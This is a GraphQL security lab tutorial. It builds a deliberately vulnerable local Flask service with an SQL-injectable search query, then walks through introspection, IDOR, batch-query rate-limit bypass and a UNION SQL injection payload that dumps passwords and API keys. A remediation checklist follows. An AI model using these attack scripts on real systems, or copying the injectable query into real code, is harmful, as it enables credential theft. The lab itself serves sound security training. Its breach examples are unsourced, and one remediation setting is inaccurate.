# Lab 09: GraphQL Security Testing

## Objective

Attack a GraphQL-style API from Kali Linux using four techniques:

1. **Introspection abuse** — dump the full schema to discover hidden types, fields, and mutations
2. **IDOR via GraphQL** — access any user's data including passwords and API keys by changing the `id` argument
3. **Batch query attack** — dump all users in a single batched request, bypassing rate limits designed for single queries
4. **SQL injection via GraphQL variable** — inject into a `search` query variable to exfiltrate the database

---

## Background

GraphQL's flexibility — user-controlled queries, nested object traversal, batching — introduces new attack vectors not present in traditional REST APIs.

**Real-world examples:**
- **2019 GitLab (CVE-2019-5462)** — GraphQL introspection exposed internal fields including private token hashes; combined with a broken access control flaw to exfiltrate 10M+ user records.
- **2021 Shopify** — introspection enabled on production API; a researcher discovered an undocumented `internalCustomerData` field that returned PII for any shop customer.
- **2020 HackerOne (multiple)** — GraphQL IDOR across multiple programs; changing `userId` in a query argument returned other users' private data without authentication.
- **2022 Magento** — GraphQL batch queries used to bypass rate limiting on password reset; 1,000 reset attempts in a single HTTP request.

**OWASP:** A01:2021 (IDOR), A03:2021 (Injection), A05:2021 (Misconfiguration — introspection)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv09                        │
│  ┌──────────────────────┐  GraphQL queries via POST /api/graphql  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • curl / python3    │  ◀──────── data (all users, secrets) ───  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask simulating GraphQL endpoint  │  │
│                             │  Introspection: GET /api/graphql/schema│
│                             │  POST /api/graphql (queries+batch) │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv09

cat > /tmp/victim_adv09.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, re

app = Flask(__name__)
DB = '/tmp/adv09.db'

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY, username TEXT, email TEXT,
            role TEXT, password TEXT, api_key TEXT);
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY, user_id INTEGER,
            title TEXT, content TEXT, private INTEGER DEFAULT 0);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','admin@innoz.com','admin','adminpass','admin-api-key-secret'),
            (2,'alice','alice@innoz.com','user','alice123','alice-key-abc'),
            (3,'bob','bob@innoz.com','user','bob456','bob-key-xyz');
        INSERT OR IGNORE INTO posts VALUES
            (1,1,'Admin Notes','Confidential admin content',1),
            (2,2,'Alice Blog','Public post from alice',0);
    """)

def db(): c=sqlite3.connect(DB); c.row_factory=sqlite3.Row; return c

SCHEMA = {"types":{"User":{"fields":["id","username","email","role"]},
                   "Post":{"fields":["id","title","content","private"]}},
          "queries":["user(id)","users","post(id)","posts","search(query)"],
          "mutations":["createPost","updateUser"]}

@app.route('/api/graphql/schema')
def schema():
    return jsonify({'schema': SCHEMA, 'note': 'Introspection enabled in production'})

@app.route('/api/graphql', methods=['POST'])
def graphql():
    d = request.get_json() or {}
    query = d.get('query','')

    if d.get('batch'):
        results=[]
        for item in d['batch']:
            q=item.get('query','')
            m=re.search(r'user\(id:\s*(\d+)\)',q)
            if m:
                row=db().execute('SELECT * FROM users WHERE id=?',(int(m.group(1)),)).fetchone()
                results.append({'data':{'user':dict(row) if row else None}})
        return jsonify({'batch_results':results,'note':f'Processed {len(results)} queries'})

    m=re.search(r'user\(id:\s*(\d+)\)',query)
    if m:
        row=db().execute('SELECT * FROM users WHERE id=?',(int(m.group(1)),)).fetchone()
        return jsonify({'data':{'user':dict(row) if row else None}})

    if 'users' in query and 'user(' not in query:
        rows=db().execute('SELECT * FROM users').fetchall()
        return jsonify({'data':{'users':[dict(r) for r in rows]}})

    if 'search' in query:
        m2=re.search(r'search\(query:\s*"([^"]+)"\)',query)
        q2=m2.group(1) if m2 else d.get('variables',{}).get('q','')
        try:
            rows=db().execute(
                f"SELECT * FROM posts WHERE title LIKE '%{q2}%' OR content LIKE '%{q2}%'"
            ).fetchall()
            return jsonify({'data':{'posts':[dict(r) for r in rows]}})
        except Exception as e:
            return jsonify({'errors':[{'message':str(e)}]})

    return jsonify({'errors':[{'message':'Unknown query'}]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv09 --network lab-adv09 \
  -v /tmp/victim_adv09.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv09.IPAddress}}' victim-adv09):5000/api/graphql/schema" | python3 -m json.tool
```

---

### Step 2: Launch Kali + Introspection

```bash
docker run --rm -it --name kali --network lab-adv09 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv09:5000"

python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv09:5000"

schema = json.loads(urllib.request.urlopen(f"{T}/api/graphql/schema").read())
print("[*] Introspection — full schema exposed:")
print(f"    Types:     {list(schema['schema']['types'].keys())}")
print(f"    Queries:   {schema['schema']['queries']}")
print()
print("[!] In production, introspection should be DISABLED.")
print("    Attackers use it to discover every field — including undocumented ones.")
print()
for type_name, type_data in schema['schema']['types'].items():
    print(f"    type {type_name} {{")
    for f in type_data['fields']:
        print(f"      {f}")
    print("    }")
EOF
```

---

### Step 3: IDOR — Access Any User by ID

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv09:5000"

def gql(query, variables={}):
    req = urllib.request.Request(f"{T}/api/graphql",
        data=json.dumps({"query": query, "variables": variables}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] GraphQL IDOR — enumerate all users by changing id argument:")
print()
for uid in range(1, 4):
    r = gql(f"{{ user(id: {uid}) {{ id username email role password api_key }} }}")
    user = r.get('data', {}).get('user')
    if user:
        print(f"    user(id:{uid}) → username={user['username']:<8} role={user['role']:<6} "
              f"password={user['password']:<15} api_key={user['api_key']}")

print()
print("[!] All passwords and API keys exfiltrated with no authentication required")
print("    A standard REST API would have: GET /api/users/1 — this has the SAME flaw")
print("    but GraphQL makes it easier to specify exactly which fields to return")
EOF
```

**📸 Verified Output:**
```
user(id:1) → username=admin    role=admin  password=adminpass      api_key=admin-api-key-secret
user(id:2) → username=alice    role=user   password=alice123       api_key=alice-key-abc
user(id:3) → username=bob      role=user   password=bob456         api_key=bob-key-xyz
```

---

### Step 4: Batch Query Attack

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv09:5000"

print("[*] GraphQL batch attack — dump all users in ONE request:")
print("    Rate limiter counts 1 HTTP request, but we process 3 queries")
print()

batch_payload = {
    "batch": [
        {"query": "{ user(id: 1) { username password api_key } }"},
        {"query": "{ user(id: 2) { username password api_key } }"},
        {"query": "{ user(id: 3) { username password api_key } }"},
    ]
}

req = urllib.request.Request(f"{T}/api/graphql",
    data=json.dumps(batch_payload).encode(),
    headers={"Content-Type": "application/json"})
r = json.loads(urllib.request.urlopen(req).read())

print(f"    Batch processed: {r['note']}")
print()
for result in r['batch_results']:
    user = result['data']['user']
    if user:
        print(f"    {user['username']:<8} {user['password']:<15} {user['api_key']}")

print()
print("[!] One HTTP request → all users dumped")
print("    Rate limit of 10 req/min = 10 × 1000 batch queries = 10,000 queries per minute")
EOF
```

---

### Step 5: SQLi via GraphQL Search

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv09:5000"

def gql(query):
    req = urllib.request.Request(f"{T}/api/graphql",
        data=json.dumps({"query": query}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] SQL injection via GraphQL search argument:")
print()

# Normal search
r1 = gql('{ search(query: "Admin") }')
print(f"    Normal search('Admin'): {r1['data']['posts']}")

# SQLi: UNION to dump users table
sqli = "x' UNION SELECT id,username,email,password,api_key,0 FROM users--"
r2 = gql(f'{{ search(query: "{sqli}") }}')
print(f"\n[!] SQLi via GraphQL argument:")
for post in r2.get('data',{}).get('posts',[]):
    print(f"    {post}")

# Error-based to confirm
r3 = gql("{ search(query: \"x' AND INVALID_SQL--\") }")
print(f"\n    Error-based confirm: {r3.get('errors','')}")
EOF
```

---

### Step 6: All Users via `users` Query

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv09:5000"

req = urllib.request.Request(f"{T}/api/graphql",
    data=json.dumps({"query":"{ users { id username email role password api_key } }"}).encode(),
    headers={"Content-Type":"application/json"})
r = json.loads(urllib.request.urlopen(req).read())

print("[*] { users } query — dumps entire users table (no auth):")
for u in r['data']['users']:
    print(f"  {u}")
EOF
```

---

### Step 7–8: Remediation + Cleanup

```bash
python3 << 'EOF'
print("[*] GraphQL Security Checklist:")
items = [
    ("Disable introspection", "GRAPHENE_SETTINGS={'RELAY_CONNECTION_MAX_LIMIT':100}; introspection=False in production"),
    ("Object-level auth",     "resolver checks: if obj.owner != context.user: raise PermissionError"),
    ("Disable batching",      "Reject requests where query is an array, or limit batch size to 1"),
    ("Query depth limit",     "Max depth=5 prevents nested object traversal attacks"),
    ("Query complexity",      "Assign cost to each field; reject if total cost > threshold"),
    ("Rate limiting",         "Limit per user per minute, counting field resolutions not HTTP requests"),
    ("Parameterised SQL",     "Never interpolate GraphQL arguments into SQL strings"),
]
for item, fix in items:
    print(f"  {item:<25} → {fix}")
EOF
exit
```

```bash
docker rm -f victim-adv09
docker network rm lab-adv09
```

---

## Further Reading
- [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Security Testing Guide](https://portswigger.net/web-security/graphql)
